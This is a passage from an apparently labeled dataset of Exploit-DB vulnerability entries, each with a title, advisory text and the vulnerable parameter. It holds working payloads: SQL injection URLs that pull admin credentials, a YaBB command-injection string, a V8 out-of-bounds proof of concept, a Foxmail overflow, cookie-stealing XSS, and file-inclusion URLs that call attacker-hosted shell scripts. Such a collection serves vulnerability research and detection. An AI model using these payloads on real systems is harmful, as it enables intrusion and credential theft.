1.7.0.   ==================== Disclosure Timeline: ==================== 03/05-Feb-2015 – found the vulnerabilities 05-Feb-2015 - informed the developers (see [3]) 05-Feb-2015 – release date of this security advisory [without technical details] 05-Feb-2015 - forked the Github repository, to keep it available for other security researchers (see [4]) 05/06-Feb-2015 - vendor replied, will provide a patch for the vulnerabilities 09-Feb-2015 - vendor provided a patch (version 1.7.0, see [3]); technical details will be released on 19th February 2015 19-Feb-2015 - release date of this security advisory 19-Feb-2015 - send to FullDisclosure   ======== Credits: ========  Vulnerabilities found and advisory written by Steffen Rösemann.  =========== References: ===========  [1] https://github.com/a-v-k/phpBugTracker [2] http://sroesemann.blogspot.de/2015/02/sroeadv-2015-16.html [3] https://github.com/a-v-k/phpBugTracker/issues/4 [4] https://github.com/sroesemann/phpBugTracker","['project.php ', 'database.php ']",1
25570,JGS-Portal 3.0.1 - 'ID' SQL Injection source: https://www.securityfocus.com/bid/13451/info  JGS-Portal is prone to an SQL injection. This issue may potentially be exploited to compromise the software or gain unauthorized access to the database.  The consequences of exploitation will depend on the nature of the vulnerable SQL query and the capabilities of the underlying database implementation.   http://www.example.com/jgs_portal.php?id='SQL_here,"[""'ID'""]",1
9499,"New5starRating 1.0 - 'rating.php' SQL Injection New5starRating v1.0 (rating.php) Sql Inj. Vuln. ################## Yazar: Bgh7 Turk Bilisim Gucleri ################## Download; http://www.maniacomputer.com/5star_rating/New_5Star.html Bug-->Sql Inj. ################## Exp: rating.php?det=-1 union select userid,0,0,userpass from admin Panel: /admin/ ################## Thanks: milw0rm-->Str0ke  # milw0rm.com [2009-08-24]","[""'rating.php'""]",1
20387,"YaBB 9.11.2000 - 'search.pl' Arbitrary Command Execution source: https://www.securityfocus.com/bid/1921/info  YaBB (Yet Another Bulletin Board) is a popular perl-based bulletin board scripting package.  search. pl, one of several perl scripts which comprise YaBB, fails to properly validate user input which arguments a call to open().   A malicious user could supply a string containing '/../'-type sequences and shell commands. As a result of search.pl's failure to reject this type of input, it is possible to traverse the script's normal working directories, and to execute arbitrary commands on the host with the privelege level of YaBB. This can lead to an anonymous internet user gaining shell access to the host.   An attacker could easily create a malicious html form with a catsearch such as: ./../../../../../usr/bin/touch%20/tmp/foo|","[""'search.pl'""]",1
44395,"Google Chrome V8 - 'Genesis::InitializeGlobal' Out-of-Bounds Read/Write /* Bug: The Genesis::InitializeGlobal method initializes the constructor of RegExp as follows:     // Builtin functions for RegExp.prototype.     Handle<JSFunction> regexp_fun = InstallFunction(         global, ""RegExp"", JS_REGEXP_TYPE,         JSRegExp::kSize + JSRegExp::kInObjectFieldCount * kPointerSize,         JSRegExp::kInObjectFieldCount, factory->the_hole_value(),         Builtins::kRegExpConstructor);     InstallWithIntrinsicDefaultProto(isolate, regexp_fun,                                      Context::REGEXP_FUNCTION_INDEX);      Handle<SharedFunctionInfo> shared(regexp_fun->shared(), isolate);     shared->SetConstructStub(*BUILTIN_CODE(isolate, JSBuiltinsConstructStub));     shared->set_instance_class_name(isolate->heap()->RegExp_string());     shared->set_internal_formal_parameter_count(2);     shared->set_length(2);      ...  I think ""shared->expected_nof_properties()"" should be the same as JSRegExp::kInObjectFieldCount. But it doesn't set ""expected_nof_properties"", it remains 0.  There are other constructors that don't set ""expected_nof_properties"", but RegExp was the only useable constructor to exploit.  Exploit: This can affect JSFunction::GetDerivedMap, which is used to create or get a Map object for the given constructor and ""new.target"", to incorrectly compute the number of in-object properties.  Here's a snippet of the method. (https://cs.chromium.org/chromium/src/v8/src/objects.cc?rcl=0c287882ea233f299a91f6b72b56d8faaecf52c0&l=12966)  MaybeHandle<Map> JSFunction::GetDerivedMap(Isolate* isolate,                                            Handle<JSFunction> constructor,                                            Handle<JSReceiver> new_target) {   ...   // Fast case, new.target is a subclass of constructor. The map is cacheable   // (and may already have been cached). new.target.prototype is guaranteed to   // be a JSReceiver.   if (new_target->IsJSFunction()) {     Handle<JSFunction> function = Handle<JSFunction>::cast(new_target);     ...      // Create a new map with the size and number of in-object properties     // suggested by |function|.      // Link initial map and constructor function if the new.target is actually a     // subclass constructor.     if (IsDerivedConstructor(function->shared()->kind())) {       Handle<Object> prototype(function->instance_prototype(), isolate);       InstanceType instance_type = constructor_initial_map->instance_type();       DCHECK(CanSubclassHaveInobjectProperties(instance_type));       int embedder_fields =           JSObject::GetEmbedderFieldCount(*constructor_initial_map);       int pre_allocated = constructor_initial_map->GetInObjectProperties() -                           constructor_initial_map->UnusedPropertyFields();       int instance_size;       int in_object_properties;       CalculateInstanceSizeForDerivedClass(function, instance_type,                                            embedder_fields, &instance_size,                                            &in_object_properties);        int unused_property_fields = in_object_properties - pre_allocated;       Handle<Map> map =           Map::CopyInitialMap(constructor_initial_map, instance_size,                               in_object_properties, unused_property_fields);       ...       return map;     }   }  ""unused_property_fields"" is obtained by subtracting ""pre_allocated"" from ""in_object_properties"". And ""in_object_properties"" is obtained by adding the number of properties of ""new_target"" and its all super constructors using CalculateInstanceSizeForDerivedClass.  Here's CalculateInstanceSizeForDerivedClass.  void JSFunction::CalculateInstanceSizeForDerivedClass(     Handle<JSFunction> function, InstanceType instance_type,     int requested_embedder_fields, int* instance_size,     int* in_object_properties) {   Isolate* isolate = function->GetIsolate();   int expected_nof_properties = 0;   for (PrototypeIterator iter(isolate, function, kStartAtReceiver);        !iter.IsAtEnd(); iter.Advance()) {     Handle<JSReceiver> current =         PrototypeIterator::GetCurrent<JSReceiver>(iter);     if (!current->IsJSFunction()) break;     Handle<JSFunction> func(Handle<JSFunction>::cast(current));     // The super constructor should be compiled for the number of expected     // properties to be available.     Handle<SharedFunctionInfo> shared(func->shared());     if (shared->is_compiled() ||         Compiler::Compile(func, Compiler::CLEAR_EXCEPTION)) {       DCHECK(shared->is_compiled());       expected_nof_properties += shared->expected_nof_properties();     }     if (!IsDerivedConstructor(shared->kind())) {       break;     }   }   CalculateInstanceSizeHelper(instance_type, true, requested_embedder_fields,                               expected_nof_properties, instance_size,                               in_object_properties); }  It iterates over all the super constructors, and sums each constructor's ""expected_nof_properties()"".  If it fails to compile the constructor using Compiler::Compile due to somthing like a syntax error, it just clears the exception, and skips to the next iteration (Should this also count as a bug?).  So using these, we can make ""pre_allocated"" higher than ""in_object_properties"" which may lead to OOB reads/writes.  PoC: */  function gc() {     for (let i = 0; i < 20; i++)         new ArrayBuffer(0x2000000); }  class Derived extends RegExp {     constructor(a) {         const a = 1;  // syntax error, Derived->expected_nof_properties() skipped     } }  let o = Reflect.construct(RegExp, [], Derived); o.lastIndex = 0x1234;  // OOB write  gc();  /*   int pre_allocated = constructor_initial_map->GetInObjectProperties() -  // 1                       constructor_initial_map->UnusedPropertyFields();    // 0   int instance_size;   int in_object_properties;   CalculateInstanceSizeForDerivedClass(function, instance_type,                                        embedder_fields, &instance_size,                                        &in_object_properties);    // in_object_properties == 0, pre_allocated == 1   int unused_property_fields = in_object_properties - pre_allocated;   Another bug? There's a comment saying ""Fast case, new.target is a subclass of constructor."" in the JSFunction::GetDerivedMap method, but it doesn't check that ""new_target"" is actually a subclass of ""constructor"". So if ""new_target"" is not a subclass of ""constructor"", ""pre_allocated"" can be higher than ""in_object_properties"". To exploit this, it required to be able to change the value of ""constructor_initial_map->UnusedPropertyFields()"", but I couldn't find any way. So I'm not so sure about this part. */","[""'Genesis::InitializeGlobal'""]",1
2853,"SimpleBlog 2.3 - '/admin/edit.asp' SQL Injection # Title   :  simpleblog <= v 2.3 (/admin/edit.asp) Remote SQL Injection Vulnerability # Author  :  bolivar # Dork    :  ""SimpleBlog 2.3 by 8pixel.net""  ---------------------------------------------------------------------------  http://[target]/[path]/admin/edit.asp?id=-1+union+select+0,uUSERNAME,uPASSWORD,0,0,0,0,0,0+from+t_users  --------------------------------------------------------------------------- # Just for Fun!!  # milw0rm.com [2006-11-26]","[""'/admin/edit.asp'""]",1
32400,"Foxmail Email Client 6.5 - 'mailto' Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/31294/info  Foxmail Email Client is prone to a buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.  Successfully exploiting this issue will allow an attacker to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.  Foxmail Email Client 6.5 is vulnerable; other versions may also be affected.   <html> <body> <P>Author:friddy QQ:568623 <P>Result:Program Crash <BR> <A href=""mailto:A%...............................................................................................................AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.com"">ClickME</a> >Clickme</A> </body> </html>","[""'mailto'""]",1
37482,WordPress Plugin custom tables - 'key' Cross-Site Scripting source: https://www.securityfocus.com/bid/54326/info  WordPress custom tables plugin is prone to a cross-site scripting vulnerability because it fails to sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  custom tables 3.4.4 is vulnerable; prior versions may also be affected.    http://www.example.com/wordpress/wp-content/plugins/custom-tables/iframe.php?s=1&key=%22%3E%3Cscript%3Ealert%28123%29%3C/script%3E,"[""'key'""]",1
25035,"PCAL 4.x - Calendar File 'getline' Remote Buffer Overflow source: https://www.securityfocus.com/bid/12035/info  PCAL is prone to a buffer overflow vulnerability. This issue is exposed when the application handles a calendar file that contains excessively long lines. Since calendar files may originate from an external or untrusted source, this vulnerability is considered to be remote in nature.  Successful exploitation of this issue will result in execution of arbitrary code as the user of the application.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/25035.zip","['Calendar File', ""'getline'""]",1
32411,Datalife Engine CMS 7.2 - 'admin.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/31335/info  Datalife Engine CMS is prone to a cross-site scripting vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Datalife Engine CMS 7.2 is vulnerable; other versions may also be affected.   http://www.example.com/admin.php/%3E%22%3E%3CScRiPt%3Ealert('Hadi-Kiamarsi')%3C/ScRiPt%3E,"[""'admin.php'""]",1
1731,"phpMyAgenda 3.0 Final - 'rootagenda' Remote File Inclusion Title: phpMyAgenda <=3.0 Final - Remote File Include Vulnerability ----------------------------------------------------------------- Vendor: phpMyAgenda URL: http://phpmyagenda.com -----------------------------------------------------------------  Credits: Discovered by: 'Aesthetico' http://www.majorsecurity.de ----------------------------------------------------------------- Search for: ""Powered by phpMyAgenda"" -----------------------------------------------------------------  Exploitation:  /agenda.php3?rootagenda=http://www.yourspace.com/yourscript.php? /agenda2.php3?rootagenda=http://www.yourspace.com/yourscript.txt?  # milw0rm.com [2006-04-30]","[""'rootagenda'""]",1
38757,"WordPress Plugin RokStories - 'thumb.php' Multiple Vulnerabilities source: https://www.securityfocus.com/bid/62459/info  The RokStories plugin for WordPress is prone to multiple security vulnerabilities, including:  1. An arbitrary file-upload vulnerability 2. A cross-site scripting vulnerability 3. An information-disclosure vulnerability 4. A denial-of-service vulnerability  Attackers can exploit these issues to obtain sensitive information, upload arbitrary files, perform a denial-of-service attack, execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.  RokStories 1.25 is vulnerable; other versions may also be affected.   http://www.example.com/wp-content/plugins/wp_rokstories/thumb.php?src=%3Cbody%20onload=alert(document.cookie)%3E.jpg  http://www.example.com/wp-content/plugins/wp_rokstories/thumb.php?src=http://  http://www.example.com/wp-content/plugins/wp_rokstories/thumb.php?src=http://www.example.com/big_file&h=1&w=1  http://www.example.com/wp-content/plugins/wp_rokstories/thumb.php?src=http://www.example2.com/shell.php","[""'thumb.php'""]",1
